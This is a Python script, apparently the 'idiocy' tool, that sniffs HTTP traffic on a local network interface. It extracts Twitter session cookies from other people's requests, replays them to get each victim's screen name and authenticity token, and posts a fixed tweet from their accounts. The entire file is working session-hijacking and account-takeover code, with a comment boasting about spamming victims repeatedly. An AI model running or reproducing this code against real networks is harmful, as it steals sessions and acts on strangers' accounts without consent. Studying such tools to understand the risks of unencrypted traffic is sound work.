#!/usr/bin/env python
import getopt, sys, pcap, dpkt, re, httplib, urllib

status = 'I browsed twitter insecurely on a public network and all I got was this lousy tweet. http://jonty.co.uk/idiocy-what'

processed = {}

def usage(): 
    print >>sys.stderr, 'Usage: %s -i device' % sys.argv[0]
    sys.exit(1)
    
    
def deal_packet(pktlen, data, timestamp):

    eth = dpkt.ethernet.Ethernet(data)
    if isinstance(eth.data, str):
        data = eth.data
    else:
        data = eth.data.data.data

    hostMatches = re.search('Host: ((?:api|mobile|www)?\.?twitter\.com)', data)
    if hostMatches:
        host = hostMatches.group(1)
        
        cookieMatches = re.search('Cookie: ([^\n]+)', data)
        if not cookieMatches:
            return

        
        cookie = cookieMatches.group(1)

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Cookie": cookie,
        }
            
        conn = httplib.HTTPSConnection(host)
        conn.request("GET", "/", None, headers)
        response = conn.getresponse()
        page = response.read()
        

        # Newtwitter and Oldtwitter have different formatting, so be lax
        authToken = ''

        formMatches = re.search("<.*?authenticity_token.*?>", page, 0)
        if formMatches:
            authMatches = re.search("value=[\"'](.*?)[\"']", formMatches.group(0))

            if authMatches:
                authToken = authMatches.group(1)

        nameMatches = re.search('"screen_name":"(.*?)"', page, 0)
        if not nameMatches:
            nameMatches = re.search('content="(.*?)" name="session-user-screen_name"', page, 0)

        name = ''
        if nameMatches:
            print nameMatches
            name = nameMatches.group(1)

        # We don't want to repeatedly spam people - YES WE DO! - Oni
        if name in processed:
            return


        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json, text/javascript, */*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "X-PHX": "true",
            "Referer": "http://api.twitter.com/p_receiver.html",
            "Cookie": cookie
        }

        if host == 'mobile.twitter.com':

            params = urllib.urlencode({
                'tweet[text]': status,
                'authenticity_token': authToken
            })

            conn = httplib.HTTPConnection("mobile.twitter.com")
            conn.request("POST", "/", params, headers)

        else:

            params = urllib.urlencode({
                'status': status,
                'post_authenticity_token': authToken
            })

            conn = httplib.HTTPConnection("api.twitter.com")
            conn.request("POST", "/1/statuses/update.json", params, headers)


        response = conn.getresponse()
        if response.status == 200 or response.status == 302 or response.status == 403:

            if name:
                processed[name] = 1

            # 403 is a dupe tweet
            if response.status != 403:
                print "Successfully tweeted as %s" % name

        else:

            print "FAILED to tweet as %s, debug follows:" % name
            print response.status, response.reason
            print response.read() + "\n"

def main():
    # Insist on asking for device - works better on osx
    if len(sys.argv) < 2 :
        usage()

    opts, args = getopt.getopt(sys.argv[1:], 'i:h')
    device = None
    for o, a in opts:
        if o == '-i':
            device = a
        else:
            usage()
    
    cap = pcap.pcapObject()
    net, mask = pcap.lookupnet(device)
    cap.open_live(device, 1600, 0, 100)
    cap.setfilter('tcp port 80',0,0)
     
    cap.setnonblock(1) 
    

	#cap.dispatch(1, deal_packet)
	# cap loop seems better  for some reason
    while 1:
        try:
		    cap.loop(1, deal_packet)

        except KeyboardInterrupt:
            print '%d packets received, %d packets dropped, %d packets dropped by interface' % cap.stats()
            print 'shutting down'
   
if __name__ == '__main__':
    main()